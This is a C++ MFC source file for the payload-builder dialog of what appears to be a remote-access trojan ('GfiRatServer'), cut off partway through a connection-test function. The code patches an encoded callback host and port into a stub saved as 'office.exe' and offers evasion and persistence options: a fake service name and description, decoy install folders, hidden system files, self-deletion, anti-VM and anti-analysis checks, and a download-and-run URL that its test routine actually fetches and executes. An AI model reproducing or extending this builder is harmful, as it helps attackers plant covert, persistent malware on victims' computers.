// BUID.cpp : implementation file
//


#include "pch.h"
#include "GfiRatServer.h"
#include "BUID.h"
#include "encode.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// BUID dialog


BUID::BUID(CWnd* pParent /*=NULL*/)
	: CDialog(BUID::IDD, pParent)
{
	//{{AFX_DATA_INIT(BUID)
	m_Host = _T("192.168.50.142");
	m_Port = _T("9998");
	//	m_Port =((CGfiRatServerApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8000); 
	m_Group = _T("Default");
	m_Version = _T("XhcSoft1.0");
	m_green = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green1", TRUE); //绿色安装
	m_green1 = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green2", FALSE); //绿色安装
	m_green2 = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green", FALSE); //绿色安装

	m_svcname = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("服务生成", "ServiceName", "SSDKSRV");  //服务名称
	m_scname = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("服务生成", "ServiceDisplayName", "SSDKSRV Discovery Service");  //服务显示
	m_shelp = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("服务生成", "ServiceDescription", "启动您家庭网络上的 Booth 设备的检测。");  //服务描述
	m_exemeux = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("服务生成", "Eexmeux", "Cao360");      //运行互诉


	m_kbcheck = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "KbChk", FALSE); //是否捆绑
	m_edit_kb = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("Build", "KbUrl", "http://www.baidu.com/1.jpg"); //捆绑地址
	/*m_lanpenetrate = ((CGfiRatServerApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green1", TRUE);*/
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}


void BUID::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(BUID)
	DDX_Text(pDX, IDC_EDIT_HOST, m_Host);
	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDX_Text(pDX, IDC_EDIT_GROUP, m_Group);
	DDX_Text(pDX, IDC_EDIT_VERSION, m_Version);
	DDX_Check(pDX, IDC_GREEN, m_green);
	DDX_Check(pDX, IDC_GREEN2, m_green1);
	DDX_Check(pDX, IDC_GREEN3, m_green2);

	DDX_Text(pDX, IDC_EDIT_SVCNAME, m_svcname);//服务名称  DDX_Control
	DDX_Text(pDX, IDC_EDIT_SCNAME, m_scname);//显示名称   DDX_Control
	DDX_Text(pDX, IDC_EDIT_SHELP, m_shelp);//服务描述   DDX_Control
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);//安装路径
	DDX_Text(pDX, IDC_DLL_NAME, m_dllname);//安装名称

	DDX_Control(pDX, IDC_FILEATTRIBUTE, m_fileattribute);

	DDX_Check(pDX, IDC_LANPENETRATE, m_lanpenetrate);//超级复活

	DDX_Control(pDX, IDC_FILEALEIXING, m_filealeixing);
	DDX_Text(pDX, IDC_FILEALEIXING, m_houzuiming);

	DDX_Text(pDX, IDC_EXE_MEUX, m_exemeux);

	DDX_Text(pDX, IDC_AZZDS, m_azzds);
	/////////////////
	DDX_Check(pDX, IDC_DELRTD, m_delrtd);
	DDX_Check(pDX, IDC_CHECK5, m_fvm);
	DDX_Check(pDX, IDC_ZKFSMS, m_zkfsms);
	DDX_Check(pDX, IDC_CHECK6, m_fhb);
	DDX_Check(pDX, IDC_Zjz, m_zjz);
	DDX_Check(pDX, IDC_ZKFSMSA, m_fscc);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);


	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	DDX_Control(pDX, IDC_TEST_MASTER1, m_testBtn1);


	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(BUID, CDialog)
	//{{AFX_MSG_MAP(BUID)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_BN_CLICKED(IDC_GREEN2, OnGreen2)
	ON_BN_CLICKED(IDC_GREEN3, OnGreen3)
	ON_BN_CLICKED(IDC_RANDOM2, OnRandom2)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BMP, OnBmp)
	ON_BN_CLICKED(IDC_BTN_PATH, OnBtnPath)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbCheck)
	ON_BN_CLICKED(IDC_KBTEST, OnKbTest)
	ON_BN_CLICKED(IDC_TEST_MASTER1, OnTestMaster1)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &BUID::OnBnClickedOk)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// BUID message handlers
BOOL BUID::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.
	CString   str = "C:\\ProgramData\\";
	GetDlgItem(IDC_COMBO_RELEASEPATH)->SetWindowText(str);
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("C:\\Windows\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("C:\\ProgramData\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\AppPatch\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%SystemRoot%\system32\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\StormII\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\\Application Data\\Storm\\update\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\\Google\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\Application Data\DRM\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\Application Data\Microsoft.NET\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\NetMeeting\\");



	CString   str1 = "Cao360";
	GetDlgItem(IDC_EXE_MEUX)->SetWindowText(str1);
	CString   str2 = "隐藏+系统+只读";
	GetDlgItem(IDC_FILEATTRIBUTE)->SetWindowText(str2);



	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDD_ABOUTBOX);//IDS_ABOUTBOX
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDD_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	OnRandom2();


	if (((CButton*)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE)
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
		GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
		GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	}



	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void BUID::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDD_ABOUTBOX)
	{
		BUID dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}
void BUID::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM)dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}
HCURSOR BUID::OnQueryDragIcon()
{
	return (HCURSOR)m_hIcon;
}
struct DAN_DATA
{
	TCHAR szDns[300];		//上线地址
	TCHAR dwPort[32];		//上线端口
	TCHAR szGroup[50];		//上线分组
	TCHAR szVersion[32];	//上线版本
	TCHAR szGetGroup[256];	//分组唯一标识
	BOOL  bRunOnce;         //是否为绿色安装
	BOOL  bRuns;            //是否是启动目录启动
	BOOL  bService;         //是否是服务启动
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD FileAttribute;      //文件属性
	BOOL  bLanPenetrate;    //超级复活
	CHAR Mexi[100];          //运行互斥
	WORD  Dele_zd;          //安装增大
	BOOL Dele_te;            //安装自删除
	BOOL Fvm;            //vm
	BOOL Dele_fs;            //占坑防删除安装
	BOOL Fhb;           //哈波
	BOOL Zjz;
	BOOL fsc;
	CHAR szDownRun[512];   //下载运行地址
};
DAN_DATA dan_data =
{
	"           D         ",
		"",
		"",
		"",
		"",
		TRUE,			//TRUE为绿色安装，FALSE为标准安装
		TRUE,			//TRUE为启动目录启动
		TRUE,			//TRUE为服务启动
		"",
		"",
		"",
		"",
		"",
		FILE_ATTRIBUTE_NORMAL,    //文件属性
		FALSE,
		"Cao360",
		0,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		"",
};
int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;
}
void BUID::OnOK()
{
	// TODO: Add extra validation here
	UpdateData(TRUE);
	CString strSer, strSerDis, strSerDes, strReleasepath, strDllName;
	GetDlgItem(IDC_EDIT_SVCNAME)->GetWindowText(strSer);//服务名称
	GetDlgItem(IDC_EDIT_SCNAME)->GetWindowText(strSerDis);//显示名称
	GetDlgItem(IDC_EDIT_SHELP)->GetWindowText(strSerDes);//服务描述
	GetDlgItem(IDC_COMBO_RELEASEPATH)->GetWindowText(strReleasepath);//安装途径
	GetDlgItem(IDC_DLL_NAME)->GetWindowText(strDllName);//安装名称


	char DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*strrchr(DatPath, '\\') = '\0';
	lstrcat(DatPath, "\\Cache\\Loader.dat");

	strcpy(dan_data.szDns, MyEncode(m_Host.GetBuffer(0)));
	strcpy(dan_data.dwPort, MyEncode(m_Port.GetBuffer(0)));
	strcpy(dan_data.szGroup, MyEncode(m_Group.GetBuffer(0)));
	strcpy(dan_data.szVersion, MyEncode(m_Version.GetBuffer(0)));
	if (((CButton*)GetDlgItem(IDC_GREEN))->GetCheck()) //绿色运行
	{
		dan_data.bRunOnce = 1;//绿色运行
	//	MessageBox("1");
	}
	else
	{
		dan_data.bRunOnce = 2;//绿色运行
	//	MessageBox("2");
	}
	if (((CButton*)GetDlgItem(IDC_GREEN2))->GetCheck()) //启动目录运行  无需uac
	{
		dan_data.bRuns = 1;//启动目录运行  无需uac
	//	MessageBox("1");
	}
	else
	{
		dan_data.bRuns = 2;//启动目录运行  无需uac
	//	MessageBox("2");
	}
	if (((CButton*)GetDlgItem(IDC_GREEN3))->GetCheck()) //服务启动运行  无限复活
	{
		dan_data.bService = 1;//服务启动运行  无限复活
	//	MessageBox("1");
	}
	else
	{
		dan_data.bService = 2;//服务启动运行  无限复活
	//	MessageBox("2");
	}
	// 	dan_data.bRunOnce = m_green;
	// 	dan_data.bRuns = m_green1;
	// 	dan_data.bService = m_green2;
	strcpy(dan_data.SerName, strSer.GetBuffer(0));//服务名称
	strcpy(dan_data.Serdisplay, strSerDis.GetBuffer(0));//显示名称
	strcpy(dan_data.Serdesc, strSerDes.GetBuffer(0)); //服务描述
	strcpy(dan_data.ReleasePath, strReleasepath.GetBuffer(0));   //写入安装路径
	strcpy(dan_data.ReleaseName, (strDllName + m_houzuiming).GetBuffer(0));   //写入安装名称
	CString szTemp;

	GetDlgItemText(IDC_FILEATTRIBUTE, szTemp);

	if (szTemp == "正常")
		dan_data.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if (szTemp == "隐藏")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

	if (szTemp == "系统")
		dan_data.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

	if (szTemp == "只读")
		dan_data.FileAttribute = FILE_ATTRIBUTE_READONLY;

	if (szTemp == "隐藏+系统")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

	if (szTemp == "隐藏+系统+只读")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;


	if (((CButton*)GetDlgItem(IDC_LANPENETRATE))->GetCheck()) //超级复活
	{
		//执行语句A
		dan_data.bLanPenetrate = 1;//超级复活
	//	MessageBox("1");
	}
	else
	{
		dan_data.bLanPenetrate = 2;//超级复活
	//	MessageBox("2");
	}
	// 	if (!m_lanpenetrate == FALSE)
	// 	{
	// 		dan_data.bLanPenetrate = m_lanpenetrate;
	// 	}
	// 	else
	// 	{
	// 		dan_data.bLanPenetrate = m_lanpenetrate;
	// 	}



	strcpy(dan_data.Mexi, m_exemeux.GetBuffer(0));          //写入运行互诉

	dan_data.Dele_zd = (WORD)m_azzds;    //安装增大

//////////////////////////////////////////////////////////////////////////
	if (((CButton*)GetDlgItem(IDC_DELRTD))->GetCheck()) //自删除
	{
		//执行语句A
		dan_data.Dele_te = 1;  //安装自删除
	}
	else
	{
		dan_data.Dele_te = 2;  //安装自删除;
	}
	if (((CButton*)GetDlgItem(IDC_CHECK5))->GetCheck()) //反虚拟机
	{
		//执行语句A
		dan_data.Fvm = 1;  //反虚拟机
	}
	else
	{
		dan_data.Fvm = 2;  //反虚拟机
	}
	if (((CButton*)GetDlgItem(IDC_ZKFSMS))->GetCheck()) //防分析
	{
		//执行语句A
		dan_data.Dele_fs = 1;  //防分析
	}
	else
	{
		dan_data.Dele_fs = 2;  //防分析
	}
	if (((CButton*)GetDlgItem(IDC_CHECK6))->GetCheck()) //反哈勃
	{
		//执行语句A
		dan_data.Fhb = 1;  //反哈勃
	}
	else
	{
		dan_data.Fhb = 2;  //反哈勃
	}
	if (((CButton*)GetDlgItem(IDC_Zjz))->GetCheck()) //K终结者
	{
		//执行语句A
		dan_data.Zjz = 1;//K终结者
	}
	else
	{
		dan_data.Zjz = 2;//K终结者
	}
	if (((CButton*)GetDlgItem(IDC_ZKFSMSA))->GetCheck()) //360防上传
	{
		//执行语句A
		dan_data.fsc = 1;  //防360上传
	}
	else
	{
		dan_data.fsc = 2;  //防360上传
	}
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(dan_data.szDownRun, m_edit_kb.GetBuffer(0));
	}
	/*	if (!m_delrtd == FALSE)
		{
			MessageBox("安装自删除");
			dan_data.Dele_te = 1;  //安装自删除
		}
		if (!m_fvm == FALSE)//vm
		{
			MessageBox("vm");
			dan_data.Fvm = 1;  //vm
		}
		if (!m_zkfsms == FALSE)
		{
			MessageBox("防分析");
			dan_data.Dele_fs = 1;  //防分析
		}
		if (!m_fhb == FALSE)
		{
			MessageBox("HB");
			dan_data.Fhb = 1;  //hb
		}
		if (!m_zjz == FALSE)
		{
			MessageBox("K终结者");
			dan_data.Zjz=1;//K终结者
		}
		if (!m_fscc == FALSE)
		{
			MessageBox("防360上传");
			dan_data.fsc = 1;  //防360上传
		}
		*/
		//////////////////////////////////////////////////////////////////////////

		/*
				char Buffer[MAX_PATH]={0};
				GetModuleFileName(NULL, Buffer, MAX_PATH);
				*strrchr(Buffer,'\\')=0;//删除文件名，只获得路径
				strcat(Buffer,"\\小马\\");
				CreateDirectory(Buffer, NULL);
				*/

	char szFilePath[MAX_PATH] = { 0 };
	CFileDialog dlg(FALSE, "exe", "office.exe", OFN_OVERWRITEPROMPT, "可执行文件|*.exe", NULL);
	if (dlg.DoModal() != IDOK)
		return;
	wsprintf(szFilePath, "%s%s", dlg.GetPathName()/*Buffer*/, "");
	DeleteFile(szFilePath);
	CopyFile(DatPath, szFilePath, FALSE);




	DWORD wr = 0;
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	ReadFile(hFile, str, len + 1, &wr, NULL);

	CloseHandle(hFile);
	DWORD dwOffset = memfind(str, "           D         ", len, 0);
	if (dwOffset == -1)
	{
		AfxMessageBox("生成文件被占用或文件不合法!");
		return;
	}
	CFile file;
	if (file.Open(szFilePath, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
	{
		try
		{
			file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
			file.Write((char*)&dan_data, sizeof(DAN_DATA));
			//////////////////////////////////替换MZ头//////////////////////////////////
			//  			file.SeekToBegin();//从文件的第一个自己开始写入数据
			//  			file.Write("SB", lstrlen("SB"));//把mz替换成SB
			//////////////////////////////////替换MZ头//////////////////////////////////
			file.Close();
		}
		catch (...)
		{
			file.Close();
			MessageBox("文件保存失败，请检查", "提示", MB_OK | MB_ICONSTOP);
			DeleteFile(szFilePath);
			return;
		}
	}
	file.Close();

	MessageBox("生成成功!", "提示");
}
void BUID::OnBmp()
{
	CFileDialog dlg(TRUE, NULL, NULL, OFN_OVERWRITEPROMPT | 0x10000000, "bmp|*.bmp|jpg|*.jpg|All Files(*.*)|*.*|", NULL);
	char Buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, Buffer, MAX_PATH);
	*strrchr(Buffer, '\\') = 0;//删除文件名，只获得路径
	strcat(Buffer, "\\dantupian\\");
	CreateDirectory(Buffer, NULL);

	if (dlg.DoModal() != IDOK)
	{
		CloseHandle(dlg);
		return;
	}
	char szFilePath[MAX_PATH] = { 0 };
	wsprintf(szFilePath, "%s%s", Buffer, "baby.bmp");
	DeleteFile(szFilePath);
	if (CopyFile(dlg.GetPathName(), szFilePath, FALSE))
	{
		SetFileAttributes(szFilePath, FILE_ATTRIBUTE_HIDDEN);//设置文件
		AfxMessageBox("成功!");
	}
	else AfxMessageBox("捆绑失败!");
}

void BUID::OnGreen()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(TRUE);
}

void BUID::OnGreen2()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(FALSE);
}

void BUID::OnGreen3()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(TRUE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(TRUE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(TRUE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(TRUE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(FALSE);

}
int StormRand(int count)
{
	unsigned long Time = GetTickCount();
	int seed = rand() + 3;
	seed = (seed * Time) % count;
	return seed;
}
void my_stormRands(BOOL ds, CHAR Number, CHAR Data[], CHAR Low, CHAR High)
{
	CHAR str[2];
	if (ds)
		str[0] = 'a';
	else
		str[0] = 'A';

	Sleep(StormRand(10));
	for (int i = 0; i < Number; i++)
	{
		//	    Sleep(StormRand(10));
		if (i == Low || i == High)
		{
			Data[i] = ' ';
			i++;
			Data[i] = str[0] + StormRand(26);
			continue;
		}
		if (i == 0)
		{
			Data[i] = 'A' + StormRand(26);
		}
		else
		{
			Data[i] = str[0] + StormRand(26);
		}
	}
}
void BUID::OnRandom2()
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[30] = { NULL };
	ZeroMemory(ServerName, 30);

	my_stormRands(TRUE, 15, ServerName, 6, 15);  //Microsoft
	ServerName[0] = 'R';
	ServerName[1] = 's';
	SetDlgItemText(IDC_EDIT_SVCNAME, ServerName);


	// 		if(m_gdtj)  
	// 		{
	// 			//随机途径
	// 			CHAR ServerPath[30]={NULL};
	// 			ZeroMemory(ServerPath,30);
	// 			my_stormRands(TRUE,6,ServerPath,6,6);
	// 			m_remote_path.SetCurSel(1);
	// 			CString szShow;
	// 			GetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
	// 			szShow=szShow+"Microsoft "+ServerPath;
	// 			SetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
	// 		}

	if (m_green2)
	{
		CHAR DisplayName[30] = { NULL };
		ZeroMemory(DisplayName, 30);
		my_stormRands(TRUE, 15, DisplayName, 6, 15);  //Microsoft
		SetDlgItemText(IDC_EDIT_SCNAME, DisplayName);

		//随机服务描述
		CHAR Description[30] = { NULL };
		ZeroMemory(Description, 30);
		my_stormRands(TRUE, 25, Description, 6, 25);  //Microsoft
		SetDlgItemText(IDC_EDIT_SHELP, Description);
	}

	CHAR szTemp[30] = { NULL };
	my_stormRands(TRUE, 7, szTemp, 7, 15);

	CString	WJ_Name = szTemp;
	SetDlgItemText(IDC_DLL_NAME, WJ_Name/*+".exe"*/);   //文件名


// 	if(m_meux)
// 	{
// 		CHAR szMeux[50]={NULL};
// 		my_stormRands(TRUE,15,szMeux,6,15);
// 		SetDlgItemText(IDC_EXE_MEUX,szMeux);   //互诉名
// 	}

	CTime time = CTime::GetCurrentTime(); ///构造CTime对象 
	CString SVTime = time.Format("%Y%m%d");  //提取当前日期 为服务版本

	SVTime = SVTime.Right(8);  //提取后6位数
	SetDlgItemText(IDC_EDIT_VERSION, "V_" + SVTime);   //服务版本

	UpdateData(TRUE);
}

void BUID::OnBtnPath()
{
	// TODO: Add your control notification handler code here
	MessageBox("文件安装到的路径，列表中的路径为：\n1. %SystemRoot%\\system32\\,即C:\\WINDOWS\\system32\\\n2. %ProgramFiles%\\StormII\\,即C:\\Program Files\\StormII\\\n3. %ALLUSERSPROFILE%\\Application Data\\Storm\\update\\,即C:\\Documents and Settings\\All Users\\Application Data\\Storm\\update\\\n4. %ProgramFiles%\\Google\\,即C:\\Program Files\\Google\\\n5. %ProgramFiles%\\NetMeeting\\,即C:\\Program Files\\NetMeeting\\\n6. %ALLUSERSPROFILE%\\Application Data\\DRM\\,即C:\\Documents and Settings\\All Users\\Application Data\\DRM\\\n7. %ProgramFiles%\\AppPatch\\,即C:\\Program Files\\AppPatch\\\n8. %ALLUSERSPROFILE%\\Application Data\\Microsoft.NET\\,即C:\\Documents and Settings\\All Users\\Application Data\\Microsoft.NET\\\n可自己更改自定义路径，可在其中包含环境变量，最长100字节，\n设定的路径不存在会尝试创建，创建失败不会上线!\n9.文件名称支持jpg,png,pif,msc,bat,gif,exe等!", "安装路径", MB_ICONINFORMATION);
}
void BUID::OnKbCheck()
{
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
}
bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char* lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));

	const char* lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);

	memset(lpSubKey, 0, sizeof(lpSubKey));
	sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);

	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");

	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default";

	if (!CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
		return false;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if (GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND)
		return FALSE;
	else
		return TRUE;
}
void BUID::OnKbTest()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	char* lpUrl = NULL;
	char* lpFileName = NULL;
	char szFilePath[MAX_PATH] = { 0 };

	if (m_edit_kb.GetLength() == 0)
	{
		AfxMessageBox("文件地址为空，请输入文件捆绑地址");
		return;
	}

	lpUrl = m_edit_kb.GetBuffer(0);
	lpFileName = strrchr(lpUrl, '/');
	if (lpFileName == NULL)
	{
		AfxMessageBox("无法获取文件捆绑地址中的文件名");
		return;
	}

	GetTempPath(sizeof(szFilePath), szFilePath);
	strcat(szFilePath, ++lpFileName);

	HRESULT hr = URLDownloadToFile(NULL, lpUrl, szFilePath, 0, NULL);
	if (hr == S_OK)
	{
		if (!CheckFileExist(szFilePath))
		{
			AfxMessageBox("文件下载成功，但是文件不存在，很可能被杀毒软件查杀或者文件名出错");
			return;
		}
	}
	else if (hr == INET_E_DOWNLOAD_FAILURE)
	{
		AfxMessageBox("URL地址不正确，文件下载失败");
		return; //URL地址不正确，文件下载失败
	}
	else
	{
		AfxMessageBox("文件下载失败，请检查URL是否正确");
		return; //文件下载失败，请检查URL是否正确
	}
	OpenFile1(szFilePath, SW_SHOW);
	//ShellExecute(NULL, "open", szFilePath, NULL, NULL, SW_SHOW);
}
DWORD WINAPI BUID::TestMaster(LPVOID lparam)
{
	BUID* pThis = (BUID*)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{
		AfxMessageBox("socket 初始化失败");
		return false;
	}
	// 设置socket为非阻塞
	u_long argp = 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
